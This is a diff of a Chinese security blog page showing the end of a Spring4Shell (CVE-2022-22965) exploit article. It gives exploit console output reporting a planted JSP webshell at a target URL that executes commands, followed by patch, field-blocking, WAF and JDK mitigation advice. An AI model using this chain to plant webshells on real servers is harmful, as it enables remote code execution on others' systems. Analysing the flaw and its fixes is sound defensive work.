+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] 重置日志变量.</span><br><span class="line">[*] 响应代码: 200</span><br><span class="line">[*] 修改日志配置</span><br><span class="line">[*] 响应代码: 200</span><br><span class="line">[*] 响应代码: 200</span><br><span class="line">[+] 漏洞利用完成</span><br><span class="line">[+] 检查目标上的 shell 文件</span><br><span class="line">[+] 文件名: shell.jsp</span><br><span class="line">[+] Shell 应该位于: http://target:8080/shell.jsp?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://target:8080/shell.jsp?cmd=id</code>即可执行系统命令，成功验证RCE漏洞。</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
+<li><strong>升级Spring框架</strong>：升级至5.3.18+或5.2.20+版本，新版本已禁用<code>class.module</code>的参数绑定</li>
+<li><strong>配置disallowedFields</strong>：在Controller中显式禁用危险字段：</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InitBinder</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDisallowedFields</span><span class="params">(WebDataBinder binder)</span> &#123;</span><br><span class="line">    binder.setDisallowedFields(<span class="string">&quot;class.*&quot;</span>, <span class="string">&quot;Class.*&quot;</span>, <span class="string">&quot;*.class.*&quot;</span>, <span class="string">&quot;*.Class.*&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>WAF防护</strong>：在Web应用防火墙中拦截包含<code>class.module.classLoader</code>的请求参数</li>
+<li><strong>降级JDK</strong>：在不影响业务的前提下，使用JDK 8可以阻断<code>class.getModule()</code>调用链</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Spring4Shell漏洞的精妙之处在于它将Spring的参数绑定机制与Tomcat的日志系统巧妙串联，形成了一条从HTTP请求参数到JSP WebShell写入的完整攻击链。通过分析这个EXP的实现，我们可以深刻理解Java框架中参数绑定安全的重要性。在实际安全评估中，检查应用是否存在未限制的参数绑定、是否暴露ClassLoader内部属性，是发现类似漏洞的关键。</p>
+
   </div>
-</section>
+
+  <footer class="article-reactions">
+    <div class="reaction-group">
+      <button type="button" class="reaction reaction--comment" aria-label="跳转到评论区" data-action="scroll-to-comments">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-message-circle flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-message-circle"></use></svg>
+
+      </button>
+      <span class="reaction-label">评论</span>
+      
+    </div>
+    <div class="reaction-group reaction-group--right">
+      
+      <button type="button" class="reaction reaction--share" aria-label="分享" data-action="share">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-share-2 flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-share-2"></use></svg>
+
+      </button>
+      <span class="reaction-label">分享</span>
+    </div>
+  </footer>
+
+  
 
 
+  <nav class="article-actions">
+    
+      <a class="article-action article-action--prev" href="/2026/07/06/2026070611/">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-arrow-left"></use></svg>
+
+        <span class="action-label">上一篇</span>
+        <span class="action-title">CVE-2025-55182 POC与反弹Shell——Next.js React Server Components RCE深度剖析</span>
+      </a>
+    
+    
+      <a class="article-action article-action--next" href="/2026/07/06/2026070610/">
+        <span class="action-label">下一篇</span>
+        <span class="action-title">CVE-2025-24813 Tomcat PUT漏洞POC——反序列化RCE的完整利用链</span>
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-arrow-right"></use></svg>
+
+      </a>
+    
+  </nav>
+</article>
+</div>
+
+<button type="button" class="back-to-top" data-action="scroll-to-top" aria-label="返回顶部" hidden>
+  
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-arrow-up"></use></svg>
+
+</button>
+
+
+  <section class="related-paper">
+    <header class="related-paper__head">
+      <h2>
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-link"></use></svg>
+相关文章</h2>
+      <a class="related-paper__more" href="/archives/">
+        <span>查看更多</span>
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-arrow-right"></use></svg>
+
+      </a>
+    </header>
+    <div class="related-paper__grid">
+      
+        <a class="related-card" href="/2026/07/06/2026070312/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-0 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/camera.webp" alt="" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">CVE-2025-55184 React漏洞利用——RSC DoS框架与WAF绕过实战</strong>
+            <em class="related-card__date">2026-07-06</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/07/06/2026070611/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-1 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/mountain.webp" alt="" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">CVE-2025-55182 POC与反弹Shell——Next.js React Server Components RCE深度剖析</strong>
+            <em class="related-card__date">2026-07-06</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/07/06/2026070610/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-2 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/notebook.webp" alt="" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">CVE-2025-24813 Tomcat PUT漏洞POC——反序列化RCE的完整利用链</strong>
+            <em class="related-card__date">2026-07-06</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/07/06/2026070609/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-0 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/port.webp" alt="" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">CVE-2025-30208 Vite任意文件读取漏洞——多路径绕过与批量检测实现</strong>
+            <em class="related-card__date">2026-07-06</em>
+          </span>
+        </a>
+      
+    </div>
+  </section>
 
 
       
 
 
     </section>
-    
-      <aside class="paper-sidebar paper-sidebar--left">
-  
-  
-
-  <section class="side-card recent-card" data-random-posts-limit="5">
-    <h2>
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shuffle flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-shuffle"></use></svg>
-随机文章</h2>
-    <ul class="recent-list js-random-posts">
-      
-        <li>
-          <a class="recent-item" href="/2026/07/06/2026070312/">
-            <strong>CVE-2025-55184 React漏洞利用——RSC DoS框架与WAF绕过实战</strong>
-            <em>2026-07-06</em>
-          </a>
-        </li>
-      
-        <li>
-          <a class="recent-item" href="/2026/07/06/2026070611/">
-            <strong>CVE-2025-55182 POC与反弹Shell——Next.js React Server Components RCE深度剖析</strong>
-            <em>2026-07-06</em>
-          </a>
-        </li>
-      
-        <li>
-          <a class="recent-item" href="/2026/07/06/2026070612/">
-            <strong>CVE-2022-22965 Spring4Shell RCE漏洞利用——从原理到EXP实现</strong>
-            <em>2026-07-06</em>
-          </a>
-        </li>
-      
-        <li>
-          <a class="recent-item" href="/2026/07/06/2026070610/">
-            <strong>CVE-2025-24813 Tomcat PUT漏洞POC——反序列化RCE的完整利用链</strong>
-            <em>2026-07-06</em>
-          </a>
-        </li>
-      
-        <li>
-          <a class="recent-item" href="/2026/07/06/2026070609/">
-            <strong>CVE-2025-30208 Vite任意文件读取漏洞——多路径绕过与批量检测实现</strong>
-            <em>2026-07-06</em>
-          </a>
-        </li>
-      
-    </ul>
-    <script type="application/json" class="js-random-posts-data">
-    [
-    
-      {
-        "title": "CVE-2025-55184 React漏洞利用——RSC DoS框架与WAF绕过实战",
-        "url": "/2026/07/06/2026070312/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "CVE-2025-55182 POC与反弹Shell——Next.js React Server Components RCE深度剖析",
-        "url": "/2026/07/06/2026070611/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "CVE-2022-22965 Spring4Shell RCE漏洞利用——从原理到EXP实现",
-        "url": "/2026/07/06/2026070612/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "CVE-2025-24813 Tomcat PUT漏洞POC——反序列化RCE的完整利用链",
-        "url": "/2026/07/06/2026070610/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "CVE-2025-30208 Vite任意文件读取漏洞——多路径绕过与批量检测实现",
-        "url": "/2026/07/06/2026070609/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "数据清洗实战：从鳄鱼数据到加密货币数据的全流程处理",
-        "url": "/2026/07/06/2026070608/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "B站弹幕数据处理与词频分析",
-        "url": "/2026/07/06/2026070607/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "自定义网络通讯协议：基于struct的二进制协议设计",
-        "url": "/2026/07/06/2026070606/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "批量生成联系人信息并可以导入到手机通讯录",
-        "url": "/2026/07/06/2026070605/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "图片隐写术检测与提取",
-        "url": "/2026/07/06/2026070604/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "WAF基础实现：基于FastAPI中间件的轻量级Web应用防火墙",
-        "url": "/2026/07/06/2026070602/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "SSH爆破行为IP自动封禁系统：基于日志监控的自动化蓝队防御方案",
-        "url": "/2026/07/06/2026070601/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "子域名挖掘（JSFinder实现）：从JS文件中揪出隐藏的攻击面",
-        "url": "/2026/07/06/2026070603/",
-        "date": "2026-07-06"
-      },
-    
-      {
-        "title": "QRCode二维码扫描器",
-        "url": "/2026/07/05/2026070506/",
-        "date": "2026-07-05"
-      },
-    
-      {
-        "title": "手机号归属地查询与社工接口：多维度信息收集工具链解析",
-        "url": "/2026/07/05/2026070505/",
-        "date": "2026-07-05"
-      },
-    
-      {
-        "title": "社会工程学字典生成器：基于个人信息的多维度密码组合工具",
-        "url": "/2026/07/05/2026070504/",
-        "date": "2026-07-05"
-      },
-    
-      {
-        "title": "Shellcode加密免杀技术：Base64编码与字符替换实战",
-        "url": "/2026/07/05/2026070503/",
-        "date": "2026-07-05"
-      },
-    
-      {
-        "title": "Python实现MSF免杀技术：Base64加密 + 字符替换 + 反调试反沙箱",
-        "url": "/2026/07/05/2026070502/",
-        "date": "2026-07-05"
-      },
-    
-      {
-        "title": "我潜入了一个\"消费返利\"项目的启动大会——这是我的现场记录",
-        "url": "/2026/07/05/2026070501/",
-        "date": "2026-07-05"
-      },
-    
-      {
-        "title": "敏感目录扫描工具：多线程爆破Web隐藏路径",
-        "url": "/2026/07/05/2026062606/",
-        "date": "2026-07-05"
-      },
-    
-      {
-        "title": "Python 爬虫实战：从 API 请求到浏览器模拟的全链路探索",
-        "url": "/2026/07/01/2026070104/",
-        "date": "2026-07-01"
-      },
-    
-      {
-        "title": "免杀技术（Bypass AV/EDR）",
-        "url": "/2026/07/01/2026070103/",
-        "date": "2026-07-01"
-      },
-    
-      {
-        "title": "Flipper One：口袋里的开放 Linux 计算机——从愿景到现实",
-        "url": "/2026/07/01/2026070102/",
-        "date": "2026-07-01"
-      },
-    
-      {
-        "title": "震惊！2026年了，微软 Edge 居然还在内存里明文存密码？三步就能全拿走",
-        "url": "/2026/07/01/2026070101/",
-        "date": "2026-07-01"
-      },
-    
-      {
-        "title": "涉密场所办公保密设备 + 通信屏蔽设备完整选型指南",
-        "url": "/2026/06/30/2026063001/",
-        "date": "2026-06-30"
-      },
-    
-      {
-        "title": "免杀对抗之一 基础了解",
-        "url": "/2026/06/29/2026062903/",
-        "date": "2026-06-29"
-      },
-    
-      {
-        "title": "X（Twitter）平台开源情报调查技巧",
-        "url": "/2026/06/29/2026062902/",
-        "date": "2026-06-29"
-      },
-    
-      {
-        "title": "一个查询IP地理信息和CDN提供商的离线终端工具",
-        "url": "/2026/06/29/2026062901/",
-        "date": "2026-06-29"
-      },
-    
-      {
-        "title": "玩转 Flipper Zero：RFID 全功能介绍",
-        "url": "/2026/06/27/2026062702/",
-        "date": "2026-06-27"
-      },
-    
-      {
-        "title": "🎭 镜界反制：一个针对裸聊骗子的克制指南",
-        "url": "/2026/06/27/2026062701/",
-        "date": "2026-06-27"
-      },
-    
-      {
-        "title": "匿名上网方法",
-        "url": "/2026/06/26/2026062629/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "社工开盒的黑思路",
-        "url": "/2026/06/26/2026062631/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "V2ray搭建教程，操作简单，支持vless，vmess，socks5等协议，x-ui搭建教程v2ray服务器vps",
-        "url": "/2026/06/26/2026062630/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "旧手机别扔！三台安卓手机搭建本地大模型实战指南",
-        "url": "/2026/06/26/2026062625/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "从秒到毫秒：掌控 SQL 性能的 21 条硬核策略与服务层性能陷阱",
-        "url": "/2026/06/26/2026062624/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "基于策略模式优化 Java 系统角色相关功能的方案文档",
-        "url": "/2026/06/26/2026062614/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "当网络成为广场：匿名者（Anonymous）现象背后的公共议题张力",
-        "url": "/2026/06/26/2026062615/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "若依常见漏洞一把梭（上）",
-        "url": "/2026/06/26/2026062620/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "若依常见漏洞一把梭（下）",
-        "url": "/2026/06/26/2026062621/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "你真的会用搜索引擎吗？",
-        "url": "/2026/06/26/2026062618/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "破解手机锁屏密码",
-        "url": "/2026/06/26/2026062619/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "📚 序列化与反序列化：原理、实现、风险与现代开发实践",
-        "url": "/2026/06/26/2026062617/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "学校想要手机序列号有什么用",
-        "url": "/2026/06/26/2026062623/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "🛡️ 社工防御体系：从信息隐身到主动反制",
-        "url": "/2026/06/26/2026062616/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "Springboot --- 使用国内的 AI 大模型 对话",
-        "url": "/2026/06/26/2026062612/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "从 B 站弹幕到数据分析：Python 实战指南",
-        "url": "/2026/06/26/2026062611/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "物理机 Kali 改造笔记（一）",
-        "url": "/2026/06/26/2026062613/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "Spring Boot 服务层泛型抽象与代码复用实战",
-        "url": "/2026/06/26/2026062607/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "多协议蜜罐初体验 🐝",
-        "url": "/2026/06/26/2026062608/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "多协议蜜罐日志解析与可视化 📊",
-        "url": "/2026/06/26/2026062609/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "闲鱼商品搜索爬虫：从签名算法到反爬机制的完整逆向与实现",
-        "url": "/2026/06/26/2026062610/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "使用 Vue3 + Axios 与 Spring Boot 高效对接（含 token 处理）",
-        "url": "/2026/06/26/2026062605/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "如何用 Spring Security 构建无状态权限控制系统（含角色菜单控制）",
-        "url": "/2026/06/26/2026062604/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "从 0 到 1，我如何独立开发一套教务系统（EduCore）",
-        "url": "/2026/06/26/2026062603/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "Java 集合框架与数据结构核心速记笔记",
-        "url": "/2026/06/26/2026062602/",
-        "date": "2026-06-26"
-      },
-    
-      {
-        "title": "将 MSF 捆绑进入正常的APP 程序中",
-        "url": "/2024/12/10/2026062628/",
-        "date": "2024-12-10"
-      },
-    
-      {
-        "title": "古典密码学 (一)",
-        "url": "/2024/10/13/2026062627/",
-        "date": "2024-10-13"
-      }
-    
-    ]
-    </script>
-  </section>
-
-
-</aside>
-
     
   </main>
 
